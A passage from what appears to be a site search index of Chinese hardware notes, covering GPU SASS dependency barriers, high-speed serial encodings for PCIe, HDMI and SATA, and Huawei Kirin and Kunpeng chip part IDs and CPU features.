<p>\u200b\u53e6\u4e00\u65b9\u9762\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u8bbf\u5b58\u200b\u7b49\u200b\u5ef6\u8fdf\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u7684\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u662f\u200b\u540e\u7eed\u200b\u6307\u4ee4\u200b\u7684\u200b\u6e90\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5199\u540e\u200b\u8bfb\u200b\uff08RAW\uff09\uff0c\u200b\u6b64\u65f6\u200b\u4ec5\u9760\u200b stall count \u200b\u65e0\u6cd5\u200b\u4fdd\u8bc1\u200b\u540e\u7eed\u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u524d\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u5df2\u7ecf\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5230\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b write barrier\uff1a</p> <pre><code>[B------:R-:W0:-:S01]          /*0070*/                   LDS R5, [UR4] ;                                    /* 0x00000004ff057984 */\n[B------:R-:W-:Y:S03]          /*0080*/                   ULDC.64 UR4, c[0x0][0x118] ;                       /* 0x0000460000047ab9 */\n[B0-----:R-:W-:-:S01]          /*0090*/                   STG.E [R2.64], R5 ;                                /* 0x0000000502007986 */\n</code></pre> <p>0070 LDS \u200b\u6307\u4ee4\u200b\u4f1a\u200b\u5199\u5165\u200b R5\uff0cR5 \u200b\u5bc4\u5b58\u5668\u200b\u4f1a\u200b\u88ab\u200b 0090 STG \u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u3002\u200b\u56e0\u6b64\u200b 0070 LDS \u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b write barrier 0\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b\u5b83\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5230\u200b R5 \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u624d\u80fd\u200b\u5141\u8bb8\u200b 0090 STG \u200b\u6307\u4ee4\u200b\u53bb\u200b\u8bfb\u53d6\u200b R5 \u200b\u5bc4\u5b58\u5668\u200b\u3002\u200b\u5728\u200b GPGPU \u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7ea6\u675f\u200b\u53ef\u80fd\u200b\u7b80\u5316\u200b\u4e3a\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b 0070 LDS \u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u624d\u200b\u5141\u8bb8\u200b\u53d1\u5c04\u200b 0090 STG \u200b\u8d28\u91cf\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\uff0c\u200b\u5e76\u975e\u200b\u6240\u6709\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u90fd\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b barrier\u3002\u200b\u4f8b\u5982\u200b\u4e0a\u9762\u200b\u8fd9\u200b\u6bb5\u200b\u6c47\u7f16\u200b\uff0c0080 ULDC \u200b\u9700\u8981\u200b\u5199\u200b UR4 \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u800c\u200b 0070 LDS \u200b\u9700\u8981\u200b\u5199\u200b UR4 \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u8bfb\u540e\u200b\u5199\u200b\uff08WAR\uff09\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u770b\u4f3c\u200b\u9700\u8981\u200b read dependency barrier\u3002\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0cULDC \u200b\u548c\u200b LDS \u200b\u5e94\u8be5\u200b\u90fd\u200b\u5728\u200b LD/ST \u200b\u5355\u5143\u200b\u4e2d\u200b\u6267\u884c\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5b83\u4eec\u200b\u5185\u90e8\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u987a\u5e8f\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u8bfb\u9519\u200b\u503c\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5217\u4e3e\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u89c2\u5bdf\u200b\u5230\u200b\u4f1a\u200b\u4f7f\u7528\u200b write dependency barrier \u200b\u7684\u200b\u6307\u4ee4\u200b\uff1a</p> <ul> <li>BMOV</li> <li>DADD</li> <li>HMMA</li> <li>I2F</li> <li>LDGDEPBAR</li> <li>LDG</li> <li>LDL</li> <li>LDSM</li> <li>LDS</li> <li>S2R</li> <li>S2UR</li> <li>QSPC</li> </ul> <p>\u200b\u9664\u4e86\u200b BMOV \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u662f\u200b\u53ef\u53d8\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u89c2\u5bdf\u200b\u5230\u200b\u4f1a\u200b\u4f7f\u7528\u200b read dependency barrier \u200b\u7684\u200b\u6307\u4ee4\u200b\uff1a</p> <ul> <li>BMOV</li> <li>HMMA</li> <li>LDG</li> <li>LDGSTS</li> <li>LDL</li> <li>LDS</li> <li>STG</li> <li>STL</li> <li>STS</li> </ul> <p>\u200b\u9664\u4e86\u200b BMOV \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u65f6\u95f4\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/high_speed_serial.html","title":"\u9ad8\u901f\u200b\u4e32\u884c\u200b\u901a\u4fe1","text":""},{"location":"hardware/high_speed_serial.html#_2","title":"\u4ecb\u7ecd","text":"<p>\u200b\u5386\u53f2\u200b\u4e0a\u200b\uff0c\u200b\u82af\u7247\u200b\u95f4\u200b\u7684\u200b\u4f20\u8f93\u200b\u63a5\u53e3\u200b\u7ecf\u5386\u200b\u4e86\u200b\u4e32\u884c\u200b\u5230\u200b\u5e76\u884c\u200b\u518d\u200b\u5230\u200b\u4e32\u884c\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u3002\u200b\u4ece\u200b\u4e32\u884c\u200b\u5230\u200b\u5e76\u884c\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u5e76\u884c\u63a5\u53e3\u200b\u540c\u65f6\u200b\u4f20\u8f93\u200b\u591a\u8def\u200b\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u5e26\u5bbd\u200b\u3002\u200b\u4ece\u200b\u5e76\u884c\u200b\u518d\u200b\u56de\u5230\u200b\u4e32\u884c\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u968f\u7740\u200b\u5e76\u884c\u200b\u4fe1\u53f7\u200b\u6570\u200b\u589e\u5927\u200b\uff0cPCB \u200b\u8d70\u7ebf\u200b\u6108\u53d1\u200b\u56f0\u96be\u200b\uff0c\u200b\u4e32\u6270\u200b\u95ee\u9898\u200b\u6108\u53d1\u200b\u4e25\u91cd\u200b\uff0c\u200b\u96be\u4ee5\u200b\u7ee7\u7eed\u200b\u6269\u5c55\u200b\u5e76\u884c\u63a5\u53e3\u200b\u7684\u200b\u5bbd\u5ea6\u200b\u3002\u200b\u53e6\u4e00\u65b9\u9762\u200b\uff0c\u200b\u968f\u7740\u200b\u6280\u672f\u200b\u7684\u200b\u53d1\u5c55\u200b\uff0c\u200b\u4e32\u884c\u200b\u901a\u4fe1\u200b\u53d1\u5c55\u200b\u51fa\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u6280\u672f\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u901f\u5ea6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53c8\u200b\u4ece\u200b\u5e76\u884c\u200b\u56de\u5230\u200b\u4e86\u200b\u4e32\u884c\u200b\u3002</p> <p>\u200b\u5176\u4e2d\u200b\u53d1\u6325\u200b\u91cd\u8981\u200b\u4f5c\u7528\u200b\u7684\u200b\u662f\u200b SerDes\uff0c\u200b\u5b83\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u4e32\u200b\u5e76\u200b\u8f6c\u6362\u200b\uff1a\u200b\u5728\u200b\u53d1\u9001\u200b\u7aef\u200b\uff0c\u200b\u628a\u200b\u82af\u7247\u200b\u5185\u90e8\u200b\u7684\u200b\u5e76\u884c\u200b\u6570\u636e\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u4e32\u884c\u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\uff1b\u200b\u5728\u200b\u63a5\u6536\u7aef\u200b\uff0c\u200b\u628a\u200b\u4e32\u884c\u200b\u6570\u636e\u200b\u8f93\u5165\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u82af\u7247\u200b\u5185\u90e8\u200b\u7684\u200b\u5e76\u884c\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u53c2\u8003\u8d44\u6599\u200b\uff1aFrom Parallel to Serial and Back Again: Understanding SerDes</p>"},{"location":"hardware/high_speed_serial.html#_3","title":"\u4e32\u884c\u200b\u901a\u4fe1","text":"<p>\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u9ad8\u901f\u200b\u7684\u200b\u4e32\u884c\u200b\u901a\u4fe1\u200b\uff0c\u200b\u9700\u8981\u200b\u5f88\u591a\u200b\u6280\u672f\u200b\u6765\u200b\u4fdd\u8bc1\u200b\u9ad8\u9891\u7387\u200b\u4e0b\u200b\u6570\u636e\u200b\u7684\u200b\u6b63\u5e38\u200b\u4f20\u8f93\u200b\uff1a</p> <ol> <li>\u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b</li> <li>\u200b\u5185\u5d4c\u200b\u65f6\u949f\u200b\u4ee5\u53ca\u200b\u65f6\u949f\u200b\u6062\u590d\u200b</li> <li>\u200b\u6570\u636e\u7f16\u7801\u200b</li> <li>\u200b\u9884\u200b\u52a0\u91cd\u200b\u548c\u200b\u5747\u8861\u200b\uff1a</li> </ol> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b SerDes \u200b\u901f\u7387\u200b\u6709\u200b\uff1a3.125 Gb/s\uff0c6 Gb/s\uff0c10 Gb/s\uff0c28 GB/s\uff0c56 GB/s \u200b\u548c\u200b 112 Gb/s\u3002\u200b\u8fd9\u662f\u200b\u7ecf\u8fc7\u200b\u6570\u636e\u7f16\u7801\u200b\u540e\u200b\u7684\u200b\u901f\u7387\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5b9e\u9645\u200b\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u8fd8\u8981\u200b\u51cf\u53bb\u200b\u4e00\u90e8\u5206\u200b\u3002</p> <p>\u200b\u5f88\u591a\u200b\u9ad8\u901f\u200b\u534f\u8bae\u200b\u91c7\u7528\u200b\u4e86\u200b\u4e32\u884c\u200b\u901a\u4fe1\u200b\uff1a</p> <ul> <li>PCIe</li> <li>USB 3</li> <li>Ethernet</li> <li>SGMII</li> <li>Infiniband</li> <li>SATA/SAS</li> </ul> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b\u6570\u636e\u7f16\u7801\u200b\u65b9\u5f0f\u200b\u6709\u200b 4b/5b\uff0c8b/10b\uff0c64/66b \u200b\u548c\u200b 128/130b\u30024b/5b \u200b\u7684\u200b\u610f\u601d\u200b\u5c31\u662f\u200b\u6bcf\u200b 4 bit \u200b\u7684\u200b\u6570\u636e\u200b\u4f1a\u200b\u88ab\u200b\u7f16\u7801\u200b\u6210\u200b 5 bit\uff0c\u200b\u5176\u4ed6\u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u3002\u200b\u7f16\u7801\u200b\u540e\u200b\uff0c\u200b\u4fdd\u8bc1\u200b 1 \u200b\u548c\u200b 0 \u200b\u7684\u200b\u4e2a\u6570\u200b\u57fa\u672c\u76f8\u540c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u6709\u200b\u8db3\u591f\u200b\u7684\u200b\u8fb9\u6cbf\u200b\u7528\u4e8e\u200b\u65f6\u949f\u200b\u6062\u590d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u4f20\u8f93\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u4e86\u200b\uff0c\u200b\u63a5\u6536\u200b\u4fa7\u200b\u4ece\u200b\u6570\u636e\u200b\u4e2d\u200b\u6062\u590d\u200b\u65f6\u949f\u200b\u5e76\u4e14\u200b\u91c7\u6837\u200b\u3002</p> <p>\u200b\u9884\u5148\u200b\u52a0\u91cd\u200b\u548c\u200b\u5747\u8861\u200b\u89e3\u51b3\u200b\u7684\u200b\u662f\u200b\u4f20\u8f93\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u9ad8\u9891\u200b\u4fe1\u53f7\u200b\u7684\u200b\u8870\u51cf\u200b\uff1a\u200b\u65e2\u7136\u200b\u4f20\u8f93\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u5bf9\u200b\u9ad8\u9891\u200b\u4fe1\u53f7\u200b\u8870\u51cf\u200b\u7684\u200b\u6bd4\u8f83\u200b\u5389\u5bb3\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5728\u200b\u53d1\u9001\u200b\u7684\u200b\u65f6\u5019\u200b\u9884\u5148\u200b\u589e\u52a0\u200b\u9ad8\u9891\u200b\u4fe1\u53f7\u200b\u5206\u91cf\u200b\uff1b\u200b\u5747\u8861\u200b\u5219\u200b\u662f\u200b\u5728\u200b\u63a5\u6536\u7aef\u200b\u8fdb\u884c\u200b\u6ee4\u6ce2\u200b\uff0c\u200b\u628a\u200b\u60f3\u8981\u200b\u7684\u200b\u9891\u7387\u200b\u8fc7\u6ee4\u51fa\u6765\u200b\u3002</p> <p>\u200b\u5f53\u200b\u63a5\u53e3\u200b\u9700\u8981\u200b\u66f4\u200b\u9ad8\u5e26\u5bbd\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u5e38\u200b\u5c31\u662f\u200b\u7ec4\u5408\u200b\u591a\u4e2a\u200b SerDes\uff0c\u200b\u4f8b\u5982\u200b PCIe x1 \u200b\u5c31\u662f\u200b Serdes \u200b\u4e00\u6536\u200b\u4e00\u53d1\u200b\uff1bPCIe x16 \u200b\u5c31\u662f\u200b SerDes \u200b\u5341\u516d\u200b\u6536\u200b\u5341\u516d\u200b\u53d1\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5217\u4e3e\u200b\u4e00\u4e9b\u200b\u9ad8\u901f\u200b\u4e32\u884c\u200b\u901a\u4fe1\u534f\u8bae\u200b\u91c7\u7528\u200b\u7684\u200b\u6280\u672f\u200b\uff1a</p> <ol> <li>PCIe 1.0-2.0: NRZ, 8b/10b</li> <li>PCIe 3.0-5.0: NRZ, 128b/130b</li> <li>PCIe 6.0: PAM-4, FEC, 242B/256B FLIT</li> <li>HDMI 1.0-2.0:8b/10b</li> <li>HDMI 2.1:16b/18b, FEC</li> <li>DisplayPort 1.0-1.4:8b/10b</li> <li>DisplayPort 2.0-2.1:128b/132b, FEC</li> <li>SGMII\uff1a8b/10b</li> <li>SATA\uff1a8b/10b</li> <li>SAS 1-3:8b/10b</li> <li>SAS 4:128b/150b, FEC</li> </ol>"},{"location":"hardware/huawei.html","title":"\u534e\u4e3a\u200b\u82af\u7247","text":""},{"location":"hardware/huawei.html#_2","title":"\u9e92\u9e9f","text":""},{"location":"hardware/huawei.html#9000s","title":"\u9e92\u9e9f\u200b 9000s","text":"<ul> <li>\u200b\u9996\u53d1\u200b\uff1aMate 60</li> <li>1x \u200b\u5927\u6838\u200b\uff080xd02\uff09\uff0c3x \u200b\u4e2d\u6838\u200b\uff080xd42\uff09\uff0c4x \u200b\u5c0f\u6838\u200b Cortex-A510</li> <li>\u200b\u5927\u6838\u200b\u4e2d\u200b\u6838\u6709\u200b\u8d85\u7ebf\u7a0b\u200b</li> <li>\u200b\u9a6c\u826f\u200b 910</li> <li>\u200b\u4e1d\u5370\u200b Hi36A0 GFCV120</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>\u200b\u9e92\u9e9f\u200b 9000s \u200b\u82af\u7247\u200b\u6027\u80fd\u200b\u8be6\u7ec6\u200b\u89e3\u6790\u200b\u2014\u2014\u200b\u534e\u4e3a\u200b mate60 \u200b\u7cfb\u5217\u200b\uff01</li> <li>Kirin 9000S Review: How Powerful is Huawei Mate60 Pro?</li> </ul>"},{"location":"hardware/huawei.html#9010","title":"\u9e92\u9e9f\u200b 9010","text":"<ul> <li>\u200b\u9996\u53d1\u200b\uff1aPura 70</li> <li>1x \u200b\u5927\u6838\u200b\uff080xd03\uff0c\u200b\u6700\u5927\u200b 2.3 GHz\uff09\uff0c3x \u200b\u4e2d\u6838\u200b\uff080xd42\uff0c\u200b\u6700\u5927\u200b 2.18 GHz\uff09\uff0c4x \u200b\u5c0f\u6838\u200b Cortex-A510\uff08impl 0x41, part 0xd46\uff0c\u200b\u6700\u5927\u200b 1.55 GHz\uff09</li> <li>2+6+4=12 \u200b\u7ebf\u7a0b\u200b</li> <li>all CPU features: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp asimdrdm jscvt fcma lrcpc dcpop sha3 sm3 sm4 asimddp sha512 sve asimdfhm dit uscat ilrcpc flagm ssbs sb paca pacg dcpodp flagm2 frint svei8mm svebf16 i8mm bf16 bti</li> <li>\u200b\u5927\u6838\u200b\u4e2d\u200b\u6838\u6709\u200b\u8d85\u7ebf\u7a0b\u200b</li> <li>\u200b\u9a6c\u826f\u200b 910</li> <li>\u200b\u4e1d\u5370\u200b Hi36A0 GFCV121</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>\u200b\u534e\u4e3a\u200b Pura70 \u200b\u80fd\u6548\u200b\u5206\u6790\u200b\uff1a\u200b\u67b6\u6784\u200b\u8fdb\u6b65\u200b\u5f88\u5927\u200b\uff01</li> <li>HiSilicon Kirin 9010</li> <li>Huawei\u2019s Kirin 9010 Is a Reality Check for China\u2019s Semiconductor Ambitions</li> </ul>"},{"location":"hardware/huawei.html#9020","title":"\u9e92\u9e9f\u200b 9020","text":"<ul> <li>\u200b\u9996\u53d1\u200b\uff1aMate 70</li> <li>1x \u200b\u5927\u6838\u200b\uff080xd05\uff09\uff0c3x \u200b\u4e2d\u6838\u200b\uff0c4x \u200b\u5c0f\u6838\u200b</li> <li>\u200b\u5927\u6838\u200b\u4e2d\u200b\u6838\u6709\u200b\u8d85\u7ebf\u7a0b\u200b</li> <li>\u200b\u9a6c\u826f\u200b 920</li> <li>\u200b\u4e1d\u5370\u200b Hi36C0 GFCV110</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>Huawei Mate 70 Pro+: Exploring the HiSilicon Kirin 9020 Processor</li> <li>Details on the new Kirin 9020 chipset surface, here's what is inside the new Mate 70 series</li> <li>HiSilicon Kirin 9020 from Mate 70 Pro Plus - Die Analysis</li> <li>\u200b\u534e\u4e3a\u200b Mate70 Pro+ \u200b\u6027\u80fd\u200b\u5206\u6790\u200b\uff1a\u200b\u9e92\u9e9f\u200b 9020 \u200b\u6765\u200b\u5566\u200b\uff01</li> <li>HUAWEI PLA-AL10</li> </ul>"},{"location":"hardware/huawei.html#9020-on-pura-x","title":"\u9e92\u9e9f\u200b 9020 on Pura X","text":"<ul> <li>\u200b\u4e1d\u5370\u200b Hi36C0 GFCV111</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>\u200b\u534e\u4e3a\u200b Pura X \u200b\u53d1\u552e\u200b\u7b2c\u4e00\u200b\u65f6\u95f4\u200b\u53c8\u200b\u6d88\u8d39\u200b\u4e86\u200b\uff01\u200b\u4eca\u5e74\u200b\u6700\u200b\u60ca\u559c\u200b\u7684\u200b\u62c6\u89e3\u200b\uff0c\u200b\u5168\u65b0\u200b\u7684\u200b 9020 \u200b\u6362\u200b\u5c01\u88c5\u200b\u5de5\u827a\u200b\u4e86\u200b\uff0cCPU \u200b\u4e0d\u200b\u4e00\u6837\u200b\u4e86\u200b\uff01</li> </ul>"},{"location":"hardware/huawei.html#x90-on-matebook-pro","title":"\u9e92\u9e9f\u200b X90 on MateBook Pro","text":"<ul> <li>20 threads</li> <li>part id 0xd03\uff088 threads\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b 4 \u200b\u6838\u200b\uff0c\u200b\u540c\u200b\u9e92\u9e9f\u200b 9010 \u200b\u5927\u6838\u200b\uff09, 0xd43\uff088 threads\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b 4 \u200b\u6838\u200b\uff09, 0xd42\uff084 threads\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b 2 \u200b\u6838\u200b\uff0c\u200b\u540c\u200b\u9e92\u9e9f\u200b 9010 \u200b\u4e2d\u6838\u200b\uff09</li> <li>Features: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt fcma lrcpc dcpop sha3 sm3 sm4 asimddp sha512 sve asimdfhm dit uscat ilrcpc flagm ssbs sb paca pacg dcpodp flagm2 frint svei8mm svebf16 i8mm bf16 dgh bti ecv</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>\u3010\u200b\u8001\u6234\u200b\u3011\u200b\u7ee7\u7eed\u200b\u6765\u200b\u6298\u817e\u200b\u9e3f\u8499\u200b\u7535\u8111\u200b\uff01\u200b\u6709\u200b\u4f60\u4eec\u200b\u6700\u200b\u5173\u5fc3\u200b\u7684\u200b CPU \u200b\u4fe1\u606f\u200b\uff0c\u200b\u8bbe\u5907\u200b\u6811\u957f\u200b\u5565\u6837\u200b\uff0c\u200b\u5305\u200b\u7ba1\u7406\u200b\u80fd\u200b\u4e0d\u80fd\u200b\u7528\u200b...</li> <li>\u200b\u5982\u4f55\u200b\u770b\u5f85\u200b\u5728\u200b 5 \u200b\u6708\u200b 8 \u200b\u65e5\u200b\u9e3f\u8499\u200b\u7535\u8111\u200b\u6280\u672f\u200b\u4e0e\u200b\u751f\u6001\u200b\u6c9f\u901a\u200b\u4f1a\u4e0a\u200b\u4eae\u76f8\u200b\u7684\u200b\u9996\u6b3e\u200b\u9e3f\u8499\u200b\u7535\u8111\u200b\uff0c\u200b\u6709\u200b\u54ea\u4e9b\u200b\u4fe1\u606f\u200b\u503c\u5f97\u200b\u5173\u6ce8\u200b\uff1f - \u200b\u96f7\u71da\u97f3\u200b\u7684\u200b\u56de\u7b54\u200b - \u200b\u77e5\u4e4e\u200b</li> </ul>"},{"location":"hardware/huawei.html#hip","title":"hip","text":""},{"location":"hardware/huawei.html#hip07","title":"hip07","text":"<ul> <li>hip07 from DSDT oem table id</li> <li>hi1616</li> <li>kunpeng 916</li> <li>Cortex-A72</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>kernel/arch/arm64/kvm/hisilicon/hisi_virt.c</li> <li>A Quick Look at the Huawei HiSilicon Kunpeng 920 Arm Server CPU</li> <li>Kunpeng 916 (Hi1616) - HiSilicon</li> </ul>"},{"location":"hardware/huawei.html#hip08","title":"hip08","text":"<ul> <li>tsv110</li> <li>part id 0xd01</li> <li>No SVE</li> <li>\u200b\u534e\u4e3a\u200b\u4e91\u200b kc1 \u200b\u5b9e\u4f8b\u200b</li> <li>hip08 from DSDT oem table id</li> <li>hi1620</li> <li>kunpeng 920</li> <li>2.6 GHz</li> <li>Features: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt fcma dcpop asimddp asimdfhm</li> <li>HIP08 appears in ACPI: <code>ACPI: XSDT 0x000000002F5DFE98 0000B4 (v01 HISI   HIP08    00000000 HISI 20151124)</code></li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>kernel/arch/arm64/kvm/hisilicon/hisi_virt.c</li> <li>A Quick Look at the Huawei HiSilicon Kunpeng 920 Arm Server CPU</li> <li>config/arm: add Hisilicon kunpeng</li> </ul>"},{"location":"hardware/huawei.html#hip09","title":"hip09","text":"<ul> <li>ARMv8.5-A</li> <li>SVE (256 bits)</li> <li>part id 0xd02\uff0c\u200b\u548c\u200b\u9e92\u9e9f\u200b 9000s \u200b\u5927\u6838\u200b\u4e00\u6837\u200b</li> <li>\u200b\u534e\u4e3a\u200b\u4e91\u200b kc2 \u200b\u5b9e\u4f8b\u200b</li> <li>kunpeng 930</li> <li>Features: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt fcma lrcpc dcpop sha3 sm3 sm4 asimddp sha512 sve asimdfhm dit uscat ilrcpc flagm ssbs sb dcpodp flagm2 frint svei8mm svef32mm svef64mm svebf16 i8mm bf16 dgh rng bti ecv</li> <li>64KB L1 Cache, 512KB L2 Cache</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>Add hip09 machine discribtion</li> <li>config/arm: add Hisilicon kunpeng</li> <li>[SME] Recover hip09 and hip11 in aarch64-cores.def</li> <li>SVE_256</li> <li>hip09_prefetch_tune</li> </ul>"},{"location":"hardware/huawei.html#hip09a","title":"hip09a","text":"<p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>ACPI/IORT: Add PMCG platform information for HiSilicon HIP09A</li> </ul>"},{"location":"hardware/huawei.html#hip10","title":"hip10","text":"<ul> <li>ARMv8.5-A</li> <li>SVE</li> <li>part id 0xd03\uff0c\u200b\u548c\u200b\u9e92\u9e9f\u200b 9010 \u200b\u5927\u6838\u200b\u4e00\u6837\u200b</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>kernel/arch/arm64/kvm/hisilicon/hisi_virt.c</li> <li>dpdk/config/arm/meson.build</li> </ul>"},{"location":"hardware/huawei.html#hip10a","title":"hip10a","text":"<ul> <li>ARMv8.5-A</li> <li>SVE + SVE2 (256 bits)</li> <li>part id 0xd03\uff0c\u200b\u548c\u200b\u9e92\u9e9f\u200b 9010 \u200b\u5927\u6838\u200b\u4e00\u6837\u200b</li> <li>128KB L1 Cache, 1MB L2 Cache</li> <li>\u200b\u7591\u4f3c\u200b hip10 \u200b\u548c\u200b hip10a \u200b\u662f\u200b\u540c\u4e00\u4e2a\u200b</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>Add hip10a machine discription</li> <li>SVE_256</li> </ul>"},{"location":"hardware/huawei.html#hip10c","title":"hip10c","text":"<ul> <li>ARMv8.5-A</li> <li>SVE (256 bits)</li> <li>part id 0xd45</li> <li>96KB L1 Cache, 1MB L2 Cache</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>Add hip10c machine discription part id 0xddd</li> <li>Add hip10a machine discription part id changes from 0xddd to 0xd45</li> <li>SVE_256</li> </ul>"},{"location":"hardware/huawei.html#hip11","title":"hip11","text":"<ul> <li>ARMv8.5-A</li> <li>SVE + SVE2 (512 bits)</li> <li>part id 0xd22</li> <li>64KB L1 Cache, 512KB L2 Cache</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>Add hip11 CPU pipeline scheduling</li> <li>[SME] Recover hip09 and hip11 in aarch64-cores.def</li> <li>SVE_512</li> </ul>"},{"location":"hardware/huawei.html#hip12","title":"hip12","text":"<ul> <li>ARMv9.2-A</li> <li>SVE + SVE2 (256 bits)</li> <li>part id 0xd06</li> <li>128KB L1 Cache, 1MB L2 Cache</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>kernel/arch/arm64/kvm/hisilicon/hisi_virt.c</li> <li>Add hip12 core definition and cost model</li> <li>Add hip12 instructions pipeline</li> <li>SVE_256</li> </ul>"},{"location":"hardware/huawei.html#kunpeng-920b","title":"Kunpeng 920B","text":"<ul> <li>Kunpeng 920 V200 7270Z</li> <li>64 cores/socket</li> <li>SVE</li> <li>SMT2</li> <li>2.9 GHz</li> <li>Features: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt pacg dcpodp flagm2 frint svei8mm svef32mm svef64mm svebf16 i8mm bf16 dgh rng ecv</li> <li>\u200b\u7591\u4f3c\u200b\u7b49\u4ef7\u200b\u4e8e\u200b hip09</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>\u200b\u9cb2\u9e4f\u200b 920B 8C8G \u200b\u89c4\u683c\u200b\u865a\u673a\u200b\u8dd1\u200b MySQL 